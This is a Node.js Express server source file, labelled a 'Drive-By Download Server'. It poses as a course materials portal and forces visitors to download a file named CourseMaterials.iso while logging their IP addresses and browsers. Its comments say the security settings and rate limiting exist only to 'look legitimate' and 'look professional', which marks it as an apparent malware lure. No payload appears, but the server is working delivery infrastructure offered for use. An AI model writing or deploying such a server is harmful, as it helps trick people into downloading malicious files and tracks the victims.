/*
 * Drive-By Download Server - Course Materials Portal
 * Hosted on Render.com
 */

const express = require('express');
const path = require('path');
const fs = require('fs');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIGURATION ====================
const ISO_FILENAME = 'CourseMaterials.iso';
const DOWNLOAD_DELAY = 2000; // ms before auto-download starts
// =======================================================

// Security middleware (minimal to look legitimate)
app.use(helmet({
    contentSecurityPolicy: false, // Allow downloads
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Logging
app.use(morgan('combined'));

// Rate limiting (prevent abuse, look professional)
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // Limit each IP to 100 requests per windowMs
    message: 'Too many requests, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});
app.use(limiter);

// Static files
app.use(express.static(path.join(__dirname, 'public'), {
    setHeaders: (res, filePath) => {
        // Force download for ISO files
        if (filePath.endsWith('.iso')) {
            res.setHeader('Content-Disposition', `attachment; filename="${ISO_FILENAME}"`);
            res.setHeader('Content-Type', 'application/octet-stream');
        }
    }
}));

// ==================== ROUTES ====================

// Homepage
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Download endpoint with tracking
app.get('/download', (req, res) => {
    const userAgent = req.get('User-Agent') || 'unknown';
    const ip = req.ip || req.connection.remoteAddress;
    const timestamp = new Date().toISOString();
    
    console.log(`[DOWNLOAD] ${timestamp} | IP: ${ip} | UA: ${userAgent.substring(0, 50)}...`);
    
    // Log to file
    const logEntry = `${timestamp},${ip},"${userAgent}"\n`;
    fs.appendFileSync(path.join(__dirname, 'downloads.log'), logEntry);
    
    // Send the ISO file
    const isoPath = path.join(__dirname, 'public', 'downloads', ISO_FILENAME);
    
    if (fs.existsSync(isoPath)) {
        res.download(isoPath, ISO_FILENAME, (err) => {
            if (err) {
                console.error(`[ERROR] Download failed: ${err.message}`);
                if (!res.headersSent) {
                    res.status(404).send('File not found');
                }
            }
        });
    } else {
        console.error(`[ERROR] ISO file not found at: ${isoPath}`);
        res.status(404).send('Course materials temporarily unavailable. Please try again later.');
    }
});

// Health check endpoint for Render
app.get('/health', (req, res) => {
    const isoPath = path.join(__dirname, 'public', 'downloads', ISO_FILENAME);
    const isoExists = fs.existsSync(isoPath);
    
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        isoAvailable: isoExists,
        uptime: process.uptime()
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Error handler
app.use((err, req, res, next) => {
    console.error(`[ERROR] ${err.stack}`);
    res.status(500).send('Something went wrong!');
});

// ==================== START SERVER ====================

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║         DRIVE-BY DOWNLOAD SERVER - RUNNING               ║
╠══════════════════════════════════════════════════════════╣
║  Port:        ${PORT}                                          ║
║  ISO File:    ${ISO_FILENAME}                                    ║
║  Environment: ${process.env.NODE_ENV || 'development'}                                         ║
╠══════════════════════════════════════════════════════════╣
║  Access:      http://localhost:${PORT}                        ║
║  Download:    http://localhost:${PORT}/download               ║
║  Health:      http://localhost:${PORT}/health                 ║
╚══════════════════════════════════════════════════════════╝
    `);
    
    // Check if ISO exists
    const isoPath = path.join(__dirname, 'public', 'downloads', ISO_FILENAME);
    if (!fs.existsSync(isoPath)) {
        console.warn(`[WARN] ISO file not found at: ${isoPath}`);
        console.warn('[WARN] Place CourseMaterials.iso in public/downloads/');
    } else {
        const stats = fs.statSync(isoPath);
        console.log(`[OK] ISO file ready: ${(stats.size / 1024 / 1024).toFixed(2)} MB`);
    }
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[SHUTDOWN] SIGTERM received, closing server...');
    process.exit(0);
});
